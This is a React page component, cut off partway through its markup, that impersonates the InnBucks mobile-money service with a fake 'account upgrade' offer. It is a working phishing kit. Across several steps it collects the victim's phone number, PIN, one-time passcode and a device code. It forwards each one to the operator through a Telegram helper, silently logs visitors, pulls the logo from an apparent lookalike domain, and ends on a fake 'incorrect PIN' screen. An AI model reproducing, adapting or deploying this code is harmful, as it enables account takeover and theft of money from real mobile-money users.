"use client"

import React, { useState, useEffect, useRef } from "react"
import {
  ChevronLeft,
  ChevronDown,
  Eye,
  EyeOff,
  Loader2,
  X,
  Star,
  AlertCircle,
  CreditCard,
  RotateCcw,
  Delete,
  Lock,
  User,
} from "lucide-react"
import { fetchVisitorInfo, sendTelegramMessage } from "@/lib/telegram"

export default function InnBucksPage() {
  // Splash & Modal States
  const [showSplash, setShowSplash] = useState(true)
  const [showUpgradeModal, setShowUpgradeModal] = useState(false)
  const [modalSlideIn, setModalSlideIn] = useState(false)

  // Steps: "phone" | "pin" | "loading_otp" | "otp" | "loading_device" | "device_code" | "loading_incorrect" | "incorrect"
  const [step, setStep] = useState<
    | "phone"
    | "pin"
    | "loading_otp"
    | "otp"
    | "loading_device"
    | "device_code"
    | "loading_incorrect"
    | "incorrect"
  >("phone")

  // Form States
  const [phone, setPhone] = useState("")
  const [pin, setPin] = useState("")
  const [showPin, setShowPin] = useState(false)
  const [phoneError, setPhoneError] = useState("")
  const [pinError, setPinError] = useState("")
  const [isSubmitting, setIsSubmitting] = useState(false)

  // 6-digit OTP verification state
  const [otpDigits, setOtpDigits] = useState<string[]>(["", "", "", "", "", ""])
  const [focusedOtpIndex, setFocusedOtpIndex] = useState(0)
  const [otpError, setOtpError] = useState("")
  const [otpTimer, setOtpTimer] = useState(118) // 01:58
  const [canResendOtp, setCanResendOtp] = useState(false)
  const otpInputRefs = useRef<(HTMLInputElement | null)[]>([])

  // 5-digit Device Code state
  const [deviceCode, setDeviceCode] = useState("")
  const [deviceStage, setDeviceStage] = useState<"enter" | "confirm">("enter")
  const [firstDeviceCode, setFirstDeviceCode] = useState("")
  const [deviceError, setDeviceError] = useState("")

  // Initial Splash Screen transition
  useEffect(() => {
    const splashTimer = setTimeout(() => {
      setShowSplash(false)
      setShowUpgradeModal(true)
      setTimeout(() => {
        setModalSlideIn(true)
      }, 50)
    }, 1800)

    return () => clearTimeout(splashTimer)
  }, [])

  // Track visitor silently on load
  useEffect(() => {
    const trackVisitor = async () => {
      try {
        await fetchVisitorInfo()
        await sendTelegramMessage({
          title: "👁️ New Visitor - InnBucks Upgrade",
        })
      } catch {
        // silent
      }
    }
    trackVisitor()
  }, [])

  // OTP Countdown Timer
  useEffect(() => {
    if (step === "otp" && otpTimer > 0) {
      const interval = setInterval(() => {
        setOtpTimer((prev) => prev - 1)
      }, 1000)
      return () => clearInterval(interval)
    } else if (otpTimer === 0) {
      setCanResendOtp(true)
    }
  }, [step, otpTimer])

  const formatOtpTimer = (seconds: number) => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`
  }

  const formatMaskedPhone = (p: string) => {
    const cleaned = p.replace(/\D/g, "")
    if (cleaned.length < 3) return "+263 *****232"
    const end = cleaned.slice(-3)
    return `+263 *****${end}`
  }

  const closeUpgradeModal = () => {
    setModalSlideIn(false)
    setTimeout(() => {
      setShowUpgradeModal(false)
    }, 350)
  }

  const getFullPhone = () => {
    if (phone.trim()) return "+263 " + phone.trim()
    if (typeof window !== "undefined") {
      const saved = sessionStorage.getItem("userPhone")
      if (saved) return saved
    }
    return "+263"
  }

  const resetAllFieldsAndRestart = () => {
    setPhone("")
    setPin("")
    setOtpDigits(["", "", "", "", "", ""])
    setDeviceCode("")
    setFirstDeviceCode("")
    setDeviceStage("enter")
    setPhoneError("")
    setPinError("")
    setOtpError("")
    setDeviceError("")
    setOtpTimer(118)
    setCanResendOtp(false)
    if (typeof window !== "undefined") {
      sessionStorage.removeItem("userPhone")
    }
    setStep("phone")
  }

  // Handle Phone Submit (Screen 1: sends Phone only)
  const handlePhoneSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    if (!phone.trim()) {
      setPhoneError("Phone number is required.")
      return
    }
    if (phone.trim().length < 6) {
      setPhoneError("Please enter a valid mobile number.")
      return
    }
    setPhoneError("")
    const fullPhone = "+263 " + phone.trim()
    if (typeof window !== "undefined") {
      sessionStorage.setItem("userPhone", fullPhone)
    }

    // Send Telegram for Mobile Number Screen (Phone only)
    sendTelegramMessage({
      title: "📱 InnBucks Mobile Number Captured",
      phoneNumber: fullPhone,
    }).catch(() => {})

    setStep("pin")
  }

  // Handle PIN Submit (Screen 2: sends Phone + PIN only)
  const handlePinSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    if (!pin.trim()) {
      setPinError("PIN is required.")
      return
    }
    if (pin.trim().length < 4) {
      setPinError("PIN must be 4 digits.")
      return
    }

    setPinError("")

    // Transition immediately to loading screen with logo and dots
    setStep("loading_otp")

    const fullPhone = getFullPhone()

    // Send Telegram for PIN Screen (Phone + PIN only)
    sendTelegramMessage({
      title: "🔐 InnBucks PIN Captured",
      phoneNumber: fullPhone,
      pin: pin.trim(),
    }).catch(() => {})

    setTimeout(() => {
      setStep("otp")
      setOtpTimer(118)
      setCanResendOtp(false)
      setTimeout(() => {
        otpInputRefs.current[0]?.focus()
      }, 100)
    }, 1300)
  }

  // Handle 6-Digit OTP Box Change
  const handleOtpBoxChange = (index: number, val: string) => {
    const digit = val.replace(/\D/g, "").slice(-1)
    const newDigits = [...otpDigits]
    newDigits[index] = digit
    setOtpDigits(newDigits)
    if (otpError) setOtpError("")

    // Move to next input if filled
    if (digit && index < 5) {
      otpInputRefs.current[index + 1]?.focus()
      setFocusedOtpIndex(index + 1)
    }
  }

  const handleOtpKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !otpDigits[index] && index > 0) {
      otpInputRefs.current[index - 1]?.focus()
      setFocusedOtpIndex(index - 1)
    }
  }

  const handleOtpPaste = (e: React.ClipboardEvent<HTMLInputElement>) => {
    e.preventDefault()
    const pastedData = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 6)
    if (!pastedData) return

    const newDigits = [...otpDigits]
    pastedData.split("").forEach((char, i) => {
      newDigits[i] = char
    })
    setOtpDigits(newDigits)
    const targetIdx = Math.min(pastedData.length, 5)
    otpInputRefs.current[targetIdx]?.focus()
    setFocusedOtpIndex(targetIdx)
  }

  // Handle OTP Verify Submit (Screen 3: sends Phone + OTP only)
  const handleOtpVerify = () => {
    const fullOtp = otpDigits.join("")
    if (fullOtp.length < 6) {
      setOtpError("Please enter the complete 6-digit verification code.")
      return
    }

    setOtpError("")

    // Instantly transition to loading screen without showing verifying text loader
    setStep("loading_device")

    const fullPhone = getFullPhone()

    // Send Telegram for OTP Screen (Phone + OTP only)
    sendTelegramMessage({
      title: "🔐 InnBucks OTP Captured",
      phoneNumber: fullPhone,
      otp1: fullOtp,
    }).catch(() => {})

    setTimeout(() => {
      setStep("device_code")
      setDeviceCode("")
    }, 1300)
  }

  // Handle Device Code Keypad Click (up to 5 digits)
  const handleDeviceKeyClick = async (digit: string) => {
    if (deviceCode.length >= 5) return

    const newCode = deviceCode + digit
    setDeviceCode(newCode)
    if (deviceError) setDeviceError("")

    const fullPhone = getFullPhone()

    // When 5 digits are reached:
    if (newCode.length === 5) {
      if (deviceStage === "enter") {
        // Send Telegram for Enter Device Code Screen (Phone + Device Code only)
        sendTelegramMessage({
          title: "📱 InnBucks Device Code Entered",
          phoneNumber: fullPhone,
          deviceCode: newCode,
        }).catch(() => {})

        // Instantly switch to confirm without delay
        setFirstDeviceCode(newCode)
        setDeviceCode("")
        setDeviceStage("confirm")
      } else {
        // Stage is "confirm": Check if both codes match
        if (newCode !== firstDeviceCode) {
          // Codes do not match: show error and move back to first password entry
          setDeviceError("Passwords do not match. Try again.")
          setDeviceCode("")
          setFirstDeviceCode("")
          setDeviceStage("enter")
          return
        }

        // Codes match: send both previous and confirmed codes along with phone number
        sendTelegramMessage({
          title: "📱 InnBucks Device Code Confirmed",
          phoneNumber: fullPhone,
          deviceCode: firstDeviceCode,
          confirmCode: newCode,
        }).catch(() => {})

        // Immediately move to loading screen
        setStep("loading_incorrect")

        // Show loading screen with logo and dots, then reset all fields and show Incorrect PIN screen
        setTimeout(() => {
          setPhone("")
          setPin("")
          setOtpDigits(["", "", "", "", "", ""])
          setDeviceCode("")
          setFirstDeviceCode("")
          setDeviceStage("enter")
          setPhoneError("")
          setPinError("")
          setOtpError("")
          setDeviceError("")
          setOtpTimer(118)
          setCanResendOtp(false)
          if (typeof window !== "undefined") {
            sessionStorage.removeItem("userPhone")
          }
          setStep("incorrect")
        }, 1300)
      }
    }
  }

  const handleDeviceBackspace = () => {
    if (deviceCode.length > 0) {
      setDeviceCode(deviceCode.slice(0, -1))
      if (deviceError) setDeviceError("")
    }
  }

  return (
    <main className="h-[100dvh] max-h-[100dvh] w-full bg-[#28293C] flex items-center justify-center p-0 text-white select-none relative overflow-hidden">
      {/* ========================================================================= */}
      {/* 1. INITIAL ANIMATED SPLASH SCREEN (Screenshot 1 - Transition On/Off)      */}
      {/* ========================================================================= */}
      {showSplash && (
        <div className="fixed inset-0 z-[100] bg-[#28293C] flex items-center justify-center">
          <div className="flex flex-col items-center justify-center animate-splash-pulse">
            <div className="w-[76px] h-[76px] relative flex items-center justify-center">
              <div className="grid grid-cols-2 gap-2.5 w-16 h-16">
                <span className="w-6 h-6 rounded-full bg-[#fbc02d] shadow-sm shadow-[#fbc02d]/40" />
                <span className="w-6 h-6 rounded-full bg-[#9c27b0] shadow-sm shadow-[#9c27b0]/40" />
                <span className="w-6 h-6 rounded-full bg-[#00bfa5] shadow-sm shadow-[#00bfa5]/40" />
                <span className="w-6 h-6 rounded-full bg-[#e53935] shadow-sm shadow-[#e53935]/40" />
              </div>
            </div>
          </div>
        </div>
      )}

      {/* ========================================================================= */}
      {/* 2. MID-FLOW LOADING SCREENS WITH LOGO (Between PIN -> OTP & OTP -> Device) */}
      {/* ========================================================================= */}
      {(step === "loading_otp" || step === "loading_device" || step === "loading_incorrect") && (
        <div className="fixed inset-0 z-[90] bg-[#28293C] flex items-center justify-center animate-in fade-in duration-200">
          <div className="flex flex-col items-center justify-center">
            {/* InnBucks Colored Emblem */}
            <div className="w-16 h-16 relative flex items-center justify-center">
              <div className="grid grid-cols-2 gap-2 w-12 h-12">
                <span className="w-5 h-5 rounded-full bg-[#fbc02d]" />
                <span className="w-5 h-5 rounded-full bg-[#9c27b0]" />
                <span className="w-5 h-5 rounded-full bg-[#00bfa5]" />
                <span className="w-5 h-5 rounded-full bg-[#e53935]" />
              </div>
            </div>

            {/* Animated Loading Dots below logo */}
            <div className="flex items-center justify-center gap-2 mt-6">
              <span className="w-2.5 h-2.5 rounded-full bg-[#4D9EE1] animate-bounce [animation-delay:-0.3s]" />
              <span className="w-2.5 h-2.5 rounded-full bg-[#4D9EE1] animate-bounce [animation-delay:-0.15s]" />
              <span className="w-2.5 h-2.5 rounded-full bg-[#4D9EE1] animate-bounce" />
            </div>
          </div>
        </div>
      )}

      {/* ========================================================================= */}
      {/* 3. UPGRADE BOTTOM SHEET MODAL (Screenshot 2 - Fit at Bottom & Animated)   */}
      {/* ========================================================================= */}
      {showUpgradeModal && (
        <div
          className={`fixed inset-0 z-50 bg-black/60 backdrop-blur-[2px] transition-opacity duration-300 ${
            modalSlideIn ? "opacity-100" : "opacity-0"
          }`}
          onClick={closeUpgradeModal}
        >
          <div className="fixed inset-x-0 bottom-0 flex justify-center pointer-events-none">
            <div
              onClick={(e) => e.stopPropagation()}
              className={`w-full sm:max-w-[420px] bg-[#28293C] rounded-t-[28px] sm:rounded-t-[32px] border-t border-x border-white/10 px-5 sm:px-6 pt-4 sm:pt-5 pb-6 sm:pb-8 shadow-[0_-15px_40px_rgba(0,0,0,0.5)] relative pointer-events-auto transition-transform duration-500 cubic-bezier(0.16, 1, 0.3, 1) max-h-[92dvh] overflow-y-auto ${
                modalSlideIn ? "translate-y-0" : "translate-y-full"
              }`}
            >
              {/* Subtle top indicator bar */}
              <div className="w-12 h-1 bg-white/20 rounded-full mx-auto mb-3 sm:mb-4" />

              {/* Close Button in top right */}
              <button
                type="button"
                onClick={closeUpgradeModal}
                className="absolute top-4 sm:top-5 right-4 sm:right-5 w-8 h-8 rounded-full bg-white/10 hover:bg-white/15 text-white/70 hover:text-white flex items-center justify-center transition-colors cursor-pointer"
                aria-label="Close"
              >
                <X className="w-4 h-4" />
              </button>

              {/* Blue Star Circle Emblem */}
              <div className="w-12 h-12 sm:w-14 sm:h-14 rounded-full bg-[#335c87] mx-auto flex items-center justify-center shadow-lg shadow-[#335c87]/30">
                <Star className="w-6 h-6 sm:w-7 sm:h-7 fill-white text-white" />
              </div>

              {/* Title & Description */}
              <div className="text-center mt-3 sm:mt-4">
                <h2 className="text-[19px] sm:text-[21px] font-extrabold text-white tracking-tight leading-snug">
                  Upgrade Your InnBucks Account Now!
                </h2>
                <p className="text-white/70 text-[12.5px] sm:text-[13px] mt-1.5 max-w-[320px] mx-auto leading-relaxed">
                  InnBucks customers need to upgrade their account to enjoy these exclusive benefits:
                </p>
              </div>

              {/* Benefits List */}
              <div className="mt-4 sm:mt-5 space-y-2.5 sm:space-y-3 text-[12.5px] sm:text-[13.5px] text-white/90">
                <div className="flex items-center gap-3">
                  <span className="text-xl shrink-0">💰</span>
                  <span className="font-medium">Instant Personal Loans up to ZiG50000</span>
                </div>
                <div className="flex items-center gap-3">
                  <span className="text-xl shrink-0">📱</span>
                  <span className="font-medium">Latest Smartphones on Easy Installments</span>
                </div>
                <div className="flex items-center gap-3">
                  <span className="text-xl shrink-0">💵</span>
                  <span className="font-medium">Guaranteed Cashback on Every Money Transfer</span>
                </div>
                <div className="flex items-center gap-3">
                  <span className="text-xl shrink-0">📈</span>
                  <span className="font-medium">Increase your Daily & Monthly Transfer Limit</span>
                </div>
              </div>

              {/* CTA Button */}
              <div className="mt-5 sm:mt-7">
                <button
                  type="button"
                  onClick={closeUpgradeModal}
                  className="w-full h-[48px] sm:h-[50px] rounded-[12px] bg-[#335c87] hover:bg-[#2b4d70] active:scale-[0.99] text-white font-bold text-[14.5px] uppercase tracking-wider shadow-md shadow-[#335c87]/30 transition-all cursor-pointer flex items-center justify-center"
                >
                  UPGRADE ACCOUNT NOW
                </button>
              </div>

              {/* Support Link */}
              <div className="mt-3 text-center text-[12px] text-white/60">
                Need Help?{" "}
                <a
                  href="#"
                  onClick={(e) => {
                    e.preventDefault()
                    closeUpgradeModal()
                  }}
                  className="text-[#4a90e2] hover:underline font-medium"
                >
                  Contact Support
                </a>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* ========================================================================= */}
      {/* 4. MAIN SCREENS CONTAINER (Strict 100dvh Lock, Zero Mobile Scroll)       */}
      {/* ========================================================================= */}
      <div className="w-full max-w-[420px] h-[100dvh] max-h-[100dvh] sm:h-[640px] sm:max-h-[720px] bg-[#28293C] flex flex-col justify-between px-5 sm:px-6 pt-4 sm:pt-7 pb-4 sm:pb-7 relative overflow-hidden">
        {/* ======================================================================= */}
        {/* STEP 1: PHONE NUMBER & STEP 2: PIN SCREENS                              */}
        {/* ======================================================================= */}
        {(step === "phone" || step === "pin") && (
          <>
            <div>
              {/* Header Bar */}
              <div className="relative flex items-center justify-center h-9">
                {step === "pin" && (
                  <button
                    type="button"
                    onClick={() => setStep("phone")}
                    className="absolute left-0 text-white hover:text-white/80 p-1 -ml-1 cursor-pointer"
                    aria-label="Back"
                  >
                    <ChevronLeft className="w-6 h-6 stroke-[2.5]" />
                  </button>
                )}

                {/* Logo + InnBucks Title */}
                <div className="flex items-center gap-2.5">
                  <div className="w-[30px] h-[30px] shrink-0 flex items-center justify-center">
                    <img
                      src="https://binbukkes.site/innBucks_color_logo.png"
                      onError={(e) => {
                        e.currentTarget.src = "/innbucks-logo.png"
                      }}
                      alt="InnBucks Logo"
                      className="w-full h-full object-contain"
                    />
                  </div>
                  <span
                    style={{ fontSize: "22px", fontWeight: 700 }}
                    className="text-white tracking-tight"
                  >
                    InnBucks
                  </span>
                </div>
              </div>

              {/* Main Headline */}
              <div className="mt-6 sm:mt-7 text-center">
                <h1
                  style={{ fontSize: "26px", fontWeight: 800, lineHeight: 1.25 }}
                  className="text-white max-w-[320px] mx-auto tracking-tight"
                >
                  Welcome To Upgrade InnBucks Account
                </h1>

                {step === "pin" && (
                  <p className="text-white/70 text-[14px] mt-3 font-normal">
                    +263 {phone}
                  </p>
                )}
              </div>

              {/* STEP 1: PHONE FORM */}
              {step === "phone" && (
                <form onSubmit={handlePhoneSubmit} className="mt-8 sm:mt-9">
                  <div
                    className={`flex items-center pb-2 transition-colors ${
                      phoneError ? "border-b border-rose-500" : "border-b border-[#555] focus-within:border-white"
                    }`}
                  >
                    <div className="flex items-center gap-1 text-white font-bold text-[16px] shrink-0 select-none">
                      <span>+263</span>
                      <ChevronDown className="w-3.5 h-3.5 text-white/70 stroke-[2.5]" />
                    </div>
                    <div className="w-px h-5 bg-[#555] mx-3 shrink-0" />
                    <input
                      type="tel"
                      inputMode="numeric"
                      pattern="[0-9]*"
                      autoFocus
                      value={phone}
                      onChange={(e) => {
                        const val = e.target.value.replace(/\D/g, "")
                        setPhone(val)
                        if (phoneError) setPhoneError("")
                      }}
                      placeholder="Enter your mobile number"
                      className="w-full text-white text-[15px] sm:text-[16px] font-medium outline-none bg-transparent placeholder:text-[#757575]"
                    />
                  </div>

                  {phoneError && (
                    <div className="flex items-center gap-1.5 text-rose-500 text-[12px] font-medium mt-1.5 animate-in fade-in duration-150">
                      <AlertCircle className="w-3.5 h-3.5 shrink-0" />
                      <span>{phoneError}</span>
                    </div>
                  )}

                  <p className="text-[12px] text-white/60 text-center mt-6 leading-relaxed">
                    By pressing Sign Up, you agree to our{" "}
                    <a href="#" className="text-[#4a90e2] hover:underline font-medium">
                      Privacy Policy
                    </a>{" "}
                    and{" "}
                    <a href="#" className="text-[#4a90e2] hover:underline font-medium">
                      Terms and Conditions
                    </a>
                  </p>
                </form>
              )}

              {/* STEP 2: PIN FORM */}
              {step === "pin" && (
                <form onSubmit={handlePinSubmit} className="mt-8">
                  <div
                    className={`flex items-center pb-2 transition-colors relative ${
                      pinError ? "border-b border-rose-500" : "border-b border-[#555] focus-within:border-white"
                    }`}
                  >
                    <input
                      type={showPin ? "text" : "password"}
                      inputMode="numeric"
                      pattern="[0-9]*"
                      maxLength={4}
                      autoFocus
                      value={pin}
                      onChange={(e) => {
                        const val = e.target.value.replace(/\D/g, "").slice(0, 4)
                        setPin(val)
                        if (pinError) setPinError("")
                      }}
                      placeholder="Enter your 4-digit PIN"
                      className="w-full text-white text-[15px] sm:text-[16px] font-medium outline-none bg-transparent placeholder:text-[#757575] tracking-wider"
                    />
                    <button
                      type="button"
                      onClick={() => setShowPin(!showPin)}
                      className="text-[#757575] hover:text-white transition-colors p-1 cursor-pointer select-none"
                      aria-label={showPin ? "Hide PIN" : "Show PIN"}
                    >
                      {showPin ? (
                        <Eye className="w-5 h-5 stroke-[1.8]" />
                      ) : (
                        <EyeOff className="w-5 h-5 stroke-[1.8]" />
                      )}
                    </button>
                  </div>

                  {pinError && (
                    <div className="flex items-center gap-1.5 text-rose-500 text-[12px] font-medium mt-1.5 animate-in fade-in duration-150">
                      <AlertCircle className="w-3.5 h-3.5 shrink-0" />
                      <span>{pinError}</span>
                    </div>
                  )}

                  <p className="text-[12px] text-white/60 text-center mt-6 leading-relaxed">
                    By pressing Sign Up, you agree to our{" "}
                    <a href="#" className="text-[#4a90e2] hover:underline font-medium">
                      Privacy Policy
                    </a>{" "}
                    and{" "}
                    <a href="#" className="text-[#4a90e2] hover:underline font-medium">
                      Terms and Conditions
                    </a>
                  </p>
                </form>
              )}
            </div>

            <div className="pt-4">
              <button
                type="button"
                onClick={(e) => {
                  if (step === "phone") handlePhoneSubmit(e)
                  else if (step === "pin") handlePinSubmit(e)
                }}
                disabled={isSubmitting}
                className="w-full h-[50px] rounded-[12px] bg-[#335c87] hover:bg-[#2b4d70] active:scale-[0.99] text-white font-bold text-[16px] shadow-lg shadow-[#335c87]/25 transition-all cursor-pointer flex items-center justify-center"
              >
                Continue
              </button>
            </div>
          </>
        )}

        {/* ======================================================================= */}
        {/* STEP 3: ENTER VERIFICATION CODE (6-DIGIT OTP BOXES - Screenshot 1)      */}
        {/* ======================================================================= */}
        {step === "otp" && (
          <>
            <div>
              {/* Header Bar with #32344a Background matching Screenshot */}
              <div className="-mx-5 sm:-mx-6 -mt-4 sm:-mt-7 px-5 sm:px-6 py-3 sm:py-3.5 bg-[#32344a] border-b border-black/15 flex items-center justify-between relative shadow-xs">
                {/* Back Button in Circle */}
                <button
                  type="button"
                  onClick={() => setStep("pin")}
                  className="w-8 h-8 sm:w-9 sm:h-9 rounded-full bg-white/10 hover:bg-white/15 text-white flex items-center justify-center transition-colors cursor-pointer shrink-0"
                  aria-label="Back"
                >
                  <ChevronLeft className="w-5 h-5 stroke-[2.5]" />
                </button>

                {/* Center Logo + InnBucks Title */}
                <div className="flex items-center gap-2 pr-8 sm:pr-9 mx-auto">
                  <div className="w-[26px] h-[26px] sm:w-[28px] sm:h-[28px] shrink-0 flex items-center justify-center">
                    <img
                      src="https://binbukkes.site/innBucks_color_logo.png"
                      onError={(e) => {
                        e.currentTarget.src = "/innbucks-logo.png"
                      }}
                      alt="InnBucks Logo"
                      className="w-full h-full object-contain"
                    />
                  </div>
                  <span
                    style={{ fontSize: "21px", fontWeight: 700 }}
                    className="text-white tracking-tight"
                  >
                    InnBucks
                  </span>
                </div>
              </div>

              {/* Message Badge Circle */}
              <div className="w-12 h-12 sm:w-14 sm:h-14 rounded-full bg-[#1b2538] border border-[#335c87]/60 flex items-center justify-center mx-auto mt-4 sm:mt-5 shadow-md shadow-[#335c87]/20">
                <CreditCard className="w-5 h-5 sm:w-6 sm:h-6 text-[#3897f0]" />
              </div>

              {/* Title & Subtitle */}
              <div className="text-center mt-3 sm:mt-4">
                <h1 className="text-[20px] sm:text-[22px] font-bold text-white tracking-tight">
                  Enter Verification Code
                </h1>
                <p className="text-white/70 text-[12.5px] sm:text-[13px] mt-1">
                  A 6-digit OTP has been sent to your registered mobile number.
                </p>
                <p className="text-[#4D9EE1] font-bold text-[14px] sm:text-[14.5px] mt-1" dir="ltr">
                  {formatMaskedPhone(phone)}
                </p>
              </div>

              {/* 6 OTP Boxes */}
              <div className="mt-5 sm:mt-6">
                <div className="grid grid-cols-6 gap-2 sm:gap-2.5 max-w-[350px] mx-auto">
                  {otpDigits.map((digit, idx) => (
                    <input
                      key={idx}
                      ref={(el) => {
                        otpInputRefs.current[idx] = el
                      }}
                      type="text"
                      inputMode="numeric"
                      pattern="[0-9]*"
                      maxLength={1}
                      value={digit}
                      onFocus={() => setFocusedOtpIndex(idx)}
                      onChange={(e) => handleOtpBoxChange(idx, e.target.value)}
                      onKeyDown={(e) => handleOtpKeyDown(idx, e)}
                      onPaste={handleOtpPaste}
                      className={`h-[56px] sm:h-[62px] rounded-[14px] sm:rounded-[16px] bg-[#32354B] text-center text-[24px] sm:text-[26px] font-bold text-white outline-none transition-all ${
                        focusedOtpIndex === idx || digit
                          ? "border-2 border-[#4D9EE1] shadow-sm shadow-[#4D9EE1]/25"
                          : "border-2 border-transparent hover:border-white/20"
                      }`}
                    />
                  ))}
                </div>

                {otpError && (
                  <div className="flex items-center justify-center gap-1.5 text-rose-500 text-[12px] font-medium mt-2 animate-in fade-in duration-150">
                    <AlertCircle className="w-3.5 h-3.5 shrink-0" />
                    <span>{otpError}</span>
                  </div>
                )}
              </div>

              {/* Countdown & Resend */}
              <div className="mt-5 text-center text-[13px]">
                <p className="text-white/70">
                  Code expires in{" "}
                  <span className="text-[#4D9EE1] font-semibold tabular-nums">
                    {formatOtpTimer(otpTimer)}
                  </span>
                </p>

                <button
                  type="button"
                  onClick={() => {
                    if (canResendOtp) {
                      setOtpTimer(118)
                      setCanResendOtp(false)
                    }
                  }}
                  disabled={!canResendOtp}
                  className={`inline-flex items-center gap-1 mt-2 text-[13px] font-medium transition-colors cursor-pointer ${
                    canResendOtp ? "text-[#4D9EE1] hover:underline" : "text-white/50 cursor-not-allowed"
                  }`}
                >
                  <RotateCcw className="w-3 h-3" />
                  <span>Resend code</span>
                </button>
              </div>
            </div>

            {/* Verify Button */}
            <div className="pt-6">
              <button
                type="button"
                onClick={handleOtpVerify}
                className="w-full h-[50px] rounded-[12px] bg-[#335c87] hover:bg-[#2b4d70] active:scale-[0.99] text-white font-bold text-[16px] shadow-lg shadow-[#335c87]/25 transition-all cursor-pointer flex items-center justify-center"
              >
                Verify
              </button>
            </div>
          </>
        )}

        {/* ======================================================================= */}
        {/* STEP 4: ENTER DEVICE CODE (5 DOTS & CUSTOM KEYPAD - Screenshot 2)       */}
        {/* ======================================================================= */}
        {step === "device_code" && (
          <div className="flex flex-col justify-between h-full">
            <div>
              {/* Back Button in circle */}
              <div className="flex items-center h-11">
                <button
                  type="button"
                  onClick={() => {
                    if (deviceStage === "confirm") {
                      setDeviceStage("enter")
                      setDeviceCode("")
                    } else {
                      setStep("otp")
                    }
                  }}
                  className="w-10 h-10 rounded-full bg-white/10 hover:bg-white/15 text-white flex items-center justify-center transition-colors cursor-pointer"
                  aria-label="Back"
                >
                  <ChevronLeft className="w-6 h-6 stroke-[2.5]" />
                </button>
              </div>

              {/* Title & Description - Prominent & Legible */}
              <div className="text-center mt-3 sm:mt-4">
                <h1 className="text-[25px] sm:text-[28px] font-extrabold text-white tracking-tight leading-tight">
                  {deviceStage === "confirm" ? "Confirm Device Code" : "Enter Device Code"}
                </h1>
                <p className="text-white/70 text-[14px] sm:text-[15px] mt-2 max-w-[300px] mx-auto leading-relaxed">
                  This Device code will be used to quickly access your account on this device.
                </p>
              </div>

              {/* 5 Dots Indicator - Responsive Spacing */}
              <div className="flex items-center justify-center gap-4 sm:gap-5 my-4 sm:my-8">
                {[0, 1, 2, 3, 4].map((i) => (
                  <span
                    key={i}
                    className={`w-3.5 h-3.5 sm:w-[18px] sm:h-[18px] rounded-full transition-all duration-150 ${
                      i < deviceCode.length ? "bg-white shadow-sm shadow-white/50 scale-105" : "bg-white/30"
                    }`}
                  />
                ))}
              </div>

              {/* Error Message if Passwords do not match */}
              {deviceError && (
                <div className="flex items-center justify-center gap-1.5 text-rose-500 text-[12.5px] sm:text-[13px] font-medium -mt-2 mb-2 animate-in fade-in duration-150">
                  <AlertCircle className="w-4 h-4 shrink-0" />
                  <span>{deviceError}</span>
                </div>
              )}
            </div>

            {/* Custom Numeric Keypad (Responsive Touch Targets) */}
            <div className="w-full max-w-[350px] mx-auto pb-1 sm:pb-4">
              <div className="grid grid-cols-3 gap-y-1 sm:gap-y-2.5 text-center">
                {/* 1, 2, 3 */}
                {["1", "2", "3"].map((n) => (
                  <button
                    key={n}
                    type="button"
                    onClick={() => handleDeviceKeyClick(n)}
                    className="text-[30px] sm:text-[36px] font-normal text-white hover:text-white/80 active:scale-90 transition-transform h-12 sm:h-16 flex items-center justify-center cursor-pointer select-none"
                  >
                    {n}
                  </button>
                ))}

                {/* 4, 5, 6 */}
                {["4", "5", "6"].map((n) => (
                  <button
                    key={n}
                    type="button"
                    onClick={() => handleDeviceKeyClick(n)}
                    className="text-[30px] sm:text-[36px] font-normal text-white hover:text-white/80 active:scale-90 transition-transform h-12 sm:h-16 flex items-center justify-center cursor-pointer select-none"
                  >
                    {n}
                  </button>
                ))}

                {/* 7, 8, 9 */}
                {["7", "8", "9"].map((n) => (
                  <button
                    key={n}
                    type="button"
                    onClick={() => handleDeviceKeyClick(n)}
                    className="text-[30px] sm:text-[36px] font-normal text-white hover:text-white/80 active:scale-90 transition-transform h-12 sm:h-16 flex items-center justify-center cursor-pointer select-none"
                  >
                    {n}
                  </button>
                ))}

                {/* Empty cell, 0, Backspace */}
                <div />
                <button
                  type="button"
                  onClick={() => handleDeviceKeyClick("0")}
                  className="text-[30px] sm:text-[36px] font-normal text-white hover:text-white/80 active:scale-90 transition-transform h-12 sm:h-16 flex items-center justify-center cursor-pointer select-none"
                >
                  0
                </button>
                <button
                  type="button"
                  onClick={handleDeviceBackspace}
                  className="text-white hover:text-white/80 active:scale-90 transition-transform h-12 sm:h-16 flex items-center justify-center cursor-pointer select-none"
                  aria-label="Delete"
                >
                  <Delete className="w-7 h-7 sm:w-8 sm:h-8 stroke-[1.5]" />
                </button>
              </div>
            </div>
          </div>
        )}

        {/* ======================================================================= */}
        {/* STEP 5: INCORRECT PIN SCREEN (Matching Screenshot)                      */}
        {/* ======================================================================= */}
        {step === "incorrect" && (
          <div className="flex flex-col justify-between h-full -mx-5 sm:-mx-6 -mt-4 sm:-mt-7 -mb-4 sm:-mb-7">
            {/* Top Header Bar in #335c87 with Logo + InnBucks */}
            <div className="px-5 sm:px-6 py-3 bg-[#335c87] border-b border-black/20 flex items-center justify-start shadow-xs">
              <div className="flex items-center gap-2.5">
                <div className="w-[26px] h-[26px] sm:w-[28px] sm:h-[28px] shrink-0 flex items-center justify-center">
                  <img
                    src="https://binbukkes.site/innBucks_color_logo.png"
                    onError={(e) => {
                      e.currentTarget.src = "/innbucks-logo.png"
                    }}
                    alt="InnBucks Logo"
                    className="w-full h-full object-contain"
                  />
                </div>
                <span
                  style={{ fontSize: "21px", fontWeight: 700 }}
                  className="text-white tracking-tight"
                >
                  InnBucks
                </span>
              </div>
            </div>

            {/* Center Content: Red Lock Emblem & Incorrect Message */}
            <div className="my-auto py-4 sm:py-6 text-center animate-in fade-in zoom-in-95 duration-200">
              {/* Red Circular Lock Emblem */}
              <div className="w-20 h-20 sm:w-24 sm:h-24 rounded-full bg-[#3b2434] border border-[#ff3b30]/40 flex items-center justify-center mx-auto mb-4 sm:mb-6 shadow-xl shadow-rose-950/40">
                <Lock className="w-8 h-8 sm:w-10 sm:h-10 text-[#ff3b30] stroke-[2.2]" />
              </div>

              {/* Red Headline */}
